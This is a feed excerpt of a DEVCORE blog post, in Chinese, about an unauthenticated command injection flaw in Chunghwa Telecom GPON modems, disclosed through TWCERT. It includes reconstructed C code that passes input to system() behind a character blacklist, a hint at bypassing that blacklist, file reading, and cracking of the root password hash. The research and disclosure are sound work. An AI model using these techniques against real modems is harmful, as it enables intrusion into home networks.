&lt;p&gt;把「漏洞研究」當成工作，一直以來是許多資訊安全技術狂熱份子的夢想，但大部分的人只看到發表漏洞、或站上研討會時的光鮮亮麗，沒注意到背後所下的苦工，事實上，「漏洞研究」往往是一個非常樸實無華，且枯燥的過程。&lt;/p&gt;

&lt;p&gt;漏洞挖掘並不像 &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/&quot;&gt;Capture the Flag (CTF)&lt;/a&gt;，一定存在著漏洞以及一個正確的解法等著你去解出，在題目的限定範圍下，只要根據現有的條件、線索去推敲出題者的意圖，十之八九可以找出問題點。 雖然還是有那種清新、優質、難到靠北的比賽例如 &lt;a href=&quot;https://ctf.hitcon.org/&quot;&gt;HITCON CTF&lt;/a&gt; 或是 &lt;a href=&quot;https://plaidctf.com/&quot;&gt;Plaid CTF&lt;/a&gt;，不過 「找出漏洞」 與 「如何利用漏洞」在本質上已經是兩件不同的事情了!&lt;/p&gt;

&lt;p&gt;CTF 很適合有一定程度的人精進自己的能力，但缺點也是如果經常在限制住的小框框內，思路及眼界容易被侷限住，真實世界的攻防往往更複雜、維度也更大! 要在一個成熟、已使用多年，且全世界資安人員都在關注的產品上挖掘出新弱點，可想而知絕對不是簡單的事! 一場 CTF 競賽頂多也就 48 小時，但在無法知道目標是否有漏洞的前提下，你能堅持多久?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;在我們上一個研究中&lt;/a&gt;，發現了三個知名 SSL VPN 廠商中不用認證的遠端代碼執行漏洞，雖然成果豐碩，但也是花了整個研究組半年的時間(加上後續處理甚至可到一年)，甚至在前兩個月完全是零產出、找不到漏洞下持續完成的。 所以對於一個好的漏洞研究人員，除了綜合能力、見識多寡以及能否深度挖掘外，還需要具備能夠獨立思考，以及興趣濃厚到耐得住寂寞等等特質，才有辦法在高難度的挑戰中殺出一條血路!&lt;/p&gt;

&lt;p&gt;漏洞研究往往不是一間公司賺錢的項目，卻又是無法不投資的部門，有多少公司能夠允許員工半年、甚至一年去做一件不一定有產出的研究? 更何況是將研究成果無條件的回報廠商只是為了讓世界更加安全? 這也就是我們 DEVCORE 不論在&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;滲透測試&lt;/a&gt;或是&lt;a href=&quot;https://devco.re/services/red-team/&quot;&gt;紅隊演練&lt;/a&gt;上比別人來的優秀的緣故，除了平日軍火庫的累積外，當遇到漏洞時，也會想盡辦法將這個漏洞的危害最大化，利用駭客思維、透過各種不同組合利用，將一個低風險漏洞利用到極致，這也才符合真實世界駭客對你的攻擊方式!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;影響範圍&quot;&gt;影響範圍&lt;/h2&gt;

&lt;p&gt;故事回到今年初的某天，我們 DEVCORE 的情資中心監控到全台灣有大量的網路地址開著 3097 連接埠，而且有趣的是，這些地址並不是什麼伺服器的地址，而是普通的家用電腦。 一般來說，家用電腦透過數據機連接上網際網路，對外絕不會開放任何服務，就算是數據機的 SSH 及 HTTP 管理介面，也只有內部網路才能訪問到，因此我們懷疑這與 ISP 的配置失誤有關! 我們也成功的在這個連接埠上挖掘出一個不用認證的遠端代碼執行漏洞! 打個比喻，就是駭客已經睡在你家客廳沙發的感覺!&lt;/p&gt;

&lt;p&gt;透過這個漏洞我們可以完成:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;竊聽網路流量，竊取網路身分、PTT 密碼，甚至你的信用卡資料&lt;/li&gt;
  &lt;li&gt;更新劫持、水坑式攻擊、內網中繼攻擊去控制你的電腦甚至個人手機&lt;/li&gt;
  &lt;li&gt;結合紅隊演練去繞過各種開發者的白名單政策&lt;/li&gt;
  &lt;li&gt;更多更多…&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;而相關的 CVE 漏洞編號為:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13411&quot;&gt;CVE-2019-13411&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13412&quot;&gt;CVE-2019-13412&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15064&quot;&gt;CVE-2019-15064&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15065&quot;&gt;CVE-2019-15065&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15066&quot;&gt;CVE-2019-15066&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;相較於以往對家用數據機的攻擊，這次的影響是更嚴重的! 以往就算漏洞再嚴重，只要家用數據機對外不開放任何連接埠，攻擊者也無法利用，但這次的漏洞包含中華電信的配置失誤，導致你家的數據機在網路上裸奔，攻擊者僅僅 &lt;strong&gt;「只要知道你的 IP 便可不需任何條件，直接進入你家內網」&lt;/strong&gt;，而且，由於沒有數據機的控制權，所以這個攻擊一般用戶是無法防禦及修補的!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;經過全網 IPv4 的掃瞄，全台灣約有 25 萬台的數據機存在此問題，&lt;strong&gt;「代表至少 25 萬個家庭受影響」&lt;/strong&gt;，不過這個結果只在 &lt;strong&gt;「掃描當下有連上網路的數據機才被納入統計」&lt;/strong&gt;，所以實際受害用戶一定大於這個數字!&lt;/p&gt;

&lt;p&gt;而透過網路地址的反查，有高達九成的受害用戶是中華電信的動態 IP，而剩下的一成則包含固定制 IP 及其他電信公司，至於為何會有其他電信公司呢? 我們的理解是中華電信作為台灣最大電信商，所持有的資源以及硬體設施也是其他電信商遠遠不及的，因此在一些比較偏僻的地段可能其他電信商到使用者的最後一哩路也還是中華電信的設備! 由於我們不是廠商，無法得知完整受影響的數據機型號列表，但筆者也是受害者 ╮(╯_╰)╭，所以可以確定最多人使用的&lt;a href=&quot;https://broadband.hinet.net/rate.do&quot;&gt;中華電信光世代 GPON 數據機&lt;/a&gt; 也在受影響範圍內!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/1.png&quot; alt=&quot;&quot; /&gt;
(&lt;a href=&quot;https://www.hungry.tw/2014/12/MiWifi.html&quot;&gt;圖片擷自網路&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞挖掘&quot;&gt;漏洞挖掘&lt;/h2&gt;

&lt;p&gt;只是一個配置失誤並不能說是什麼大問題，所以接下來我們希望能在這個服務上挖掘出更嚴重的漏洞! 軟體漏洞的挖掘，根據原始碼、執行檔以及 API 文件的有無可依序分為:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;黑箱測試&lt;/li&gt;
  &lt;li&gt;灰箱測試&lt;/li&gt;
  &lt;li&gt;白箱測試&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在什麼都沒有的的狀況下，只能依靠經驗以及對系統的了解去猜測每個指令背後的實作、並找出漏洞。&lt;/p&gt;

&lt;h3 id=&quot;黑箱測試&quot;&gt;黑箱測試&lt;/h3&gt;

&lt;p&gt;3097 連接埠提供了許多跟電信網路相關的指令，推測是中華電信給工程師遠端對數據機進行各種網路設定的除錯介面!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;其中，可以透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELP&lt;/code&gt; 指令列出所有功能，其中我們發現了一個指令叫做 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MISC&lt;/code&gt; ，看名字感覺就是把一堆不知道怎麼分類的指令歸類在這，而其中一個叫做 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCRIPT&lt;/code&gt; 吸引了我們! 它的參數為一個檔案名稱，執行後像是會把檔案當成 Shell Script 來執行，但在無法在遠端機器留下一個可控檔案的前提下，也無法透過這個指令取得任意代碼執行。 不過有趣的是，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MISC SCRIPT&lt;/code&gt; 這個指令會將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; 給顯示出來，因此可以透過這個特性去完成任意檔案讀取!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;從黑箱進化成灰箱&quot;&gt;從黑箱進化成灰箱&lt;/h3&gt;

&lt;p&gt;在漏洞的利用上，無論是記憶體的利用、或是網路的滲透，不外乎都圍繞著對目標的讀(Read)、 寫(Write) 以及代碼執行(eXecute) 三個權限的取得，現在我們取得了第一個讀的權限，接下來呢?&lt;/p&gt;

&lt;p&gt;除錯介面貌似跑在高權限使用者下，所以可以直接透過讀取系統密碼檔得到系統使用者管理登入的密碼雜湊!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;透過對 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; 使用者密碼雜湊的破解，我們成功的登入數據機 SSH 將「黑箱」轉化成「灰箱」! 雖然現在可以成功控制自己的數據機，但一般家用數據機對外是不會開放 SSH 服務的，為了達到可以「遠端」控制別人的數據機，我們還是得想辦法從 3097 這個服務拿到代碼的執行權限。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;整個中華電信的數據機是一個跑在 MIPS 處理器架構上的嵌入式 Linux 系統，而 3097 服務則是由一個在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/omcimain&lt;/code&gt; 的二進位檔案來處理，整個檔案大小有將近 5MB，對逆向工程來說並不是一個小數目，但與黑箱測試相較之下，至少有了東西可以分析了真棒!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uname -a
Linux I-040GW.cht.com.tw 2.6.30.9-5VT #1 PREEMPT Wed Jul 31 15:40:34 CST 2019
[luna SDK V1.8.0] rlx GNU/Linux

$ netstat -anp | grep 3097
tcp        0      0 127.0.0.1:3097          0.0.0.0:*               LISTEN

$ ls -lh /usr/bin/omcimain
-rwxr-xr-x    1 root   root        4.6M Aug  1 13:40 /usr/bin/omcimain

$ file /usr/bin/omcimain
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;從灰箱進化成白箱&quot;&gt;從灰箱進化成白箱&lt;/h3&gt;

&lt;p&gt;現在，我們可以透過逆向工程了解每個指令背後的原理及實作了! 不過首先，逆向工程是一個痛苦且煩悶的經過，一個小小的程式可能就包含幾萬、甚至十幾萬行的組合語言代碼，因此這時挖洞的策略就變得很重要! 從功能面來看，感覺會存在命令注入相關的漏洞，因此先以功能實作為出發點開始挖掘!&lt;/p&gt;

&lt;p&gt;整個 3097 服務的處理核心其實就是一個多層的 IF-ELSE 選項，每一個小框框對應的一個功能的實作，例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cli_config_cmdline&lt;/code&gt; 就是對應 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONFIG&lt;/code&gt; 這條指令，因此我們搭配著 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELP&lt;/code&gt; 指令的提示一一往每個功能實作挖掘!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;研究了一段時間，並沒有發現到什麼嚴重漏洞 :( 不過我們注意到，當所有指命都匹配失敗時，會進入到了一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; 的函數，這個函數的主要目的是把匹配失敗的指令接到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; 後繼續執行!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; 大致邏輯如下，由於當時 Ghidra 尚未出現，所以這份原始碼是從閱讀 MIPS 組合語言慢慢還原回來的! 其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt; 為輸入的指令，如果指令不在定義好的列表內以及指令中出現問號的話，就與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; 拼湊起來丟入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 執行! 理所當然，為了防止命令注入等相關弱點，在丟入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 前會先根據 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; 的列表檢查是否存在有害字元。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;util_trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;util_fdprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;invalid char &apos;%c&apos; in command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/tmpfile.%d.%06ld&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/diag %s &amp;gt; %s 2&amp;gt;/dev/null&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; 定義如下:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|&amp;lt;&amp;gt;(){}`;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果是你的話，能想到如何繞過嗎?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;答案很簡單，命令注入往往就是這麼的簡單且樸實無華!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;這裡我們示範了如何從 PTT 知道受害者 IP 地址，到進入它數據機實現真正意義上的「指哪打哪」!&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Pq00YUoBOsQ&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;

&lt;p&gt;故事到這邊差不多進入尾聲，整篇文章看似輕描淡寫，描述一個漏洞從發現到利用的整個經過，從結果論來說也許只是一個簡單的命令注入，但實際上中間所花的時間、走過的歪路是正在讀文章的你無法想像的，就像是在黑暗中走迷宮，在沒有走出迷宮前永遠不會知道自己正在走的這條路是不是通往目的正確道路!&lt;/p&gt;

&lt;p&gt;挖掘出新的漏洞，並不是一件容易的事，尤其是在各式攻擊手法又已趨於成熟的今天，要想出全新的攻擊手法更是難上加難! 在漏洞研究的領域上，台灣尚未擁有足夠的能量，如果平常的挑戰已經滿足不了你，想體驗真實世界的攻防，歡迎加入與我們一起交流蕉流 :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;通報時程&quot;&gt;通報時程&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2019 年 07 月 28 日 - 透過 TWCERT/CC 回報中華電信&lt;/li&gt;
  &lt;li&gt;2019 年 08 月 14 日 - 廠商回覆清查並修補設備中&lt;/li&gt;
  &lt;li&gt;2019 年 08 月 27 日 - 廠商回覆九月初修補完畢&lt;/li&gt;
  &lt;li&gt;2019 年 08 月 30 日 - 廠商回覆已完成受影響設備的韌體更新&lt;/li&gt;
  &lt;li&gt;2019 年 09 月 11 日 - 廠商回覆部分用戶需派員更新, 延後公開時間&lt;/li&gt;
  &lt;li&gt;2019 年 09 月 23 日 - 與 TWCERT/CC 確認可公開&lt;/li&gt;
  &lt;li&gt;2019 年 09 月 25 日 - 發表至 DEVCORE CONFERENCE 2019&lt;/li&gt;
  &lt;li&gt;2019 年 11 月 11 日 - 部落格文章釋出&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE/</link>
                <guid>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE</guid>
                <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 紅隊的進化，與下一步</title>
                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;「紅隊演練」近年來漸漸開始被大家提及，也開始有一些廠商推出紅隊服務。不過關於在台灣紅隊是怎麼做的就比較少人公開分享，身為第一個在台灣推紅隊演練的公司，我想就根據這兩年多來的實戰經驗，分享為什麼我們要做紅隊、我們面臨到的問題、以及在我們心中認為紅隊成員應該具備的特質。最後再分享我們現階段看到的企業資安問題，期望未來我們也可以透過紅隊演練來幫助企業補足那些問題。&lt;/p&gt;

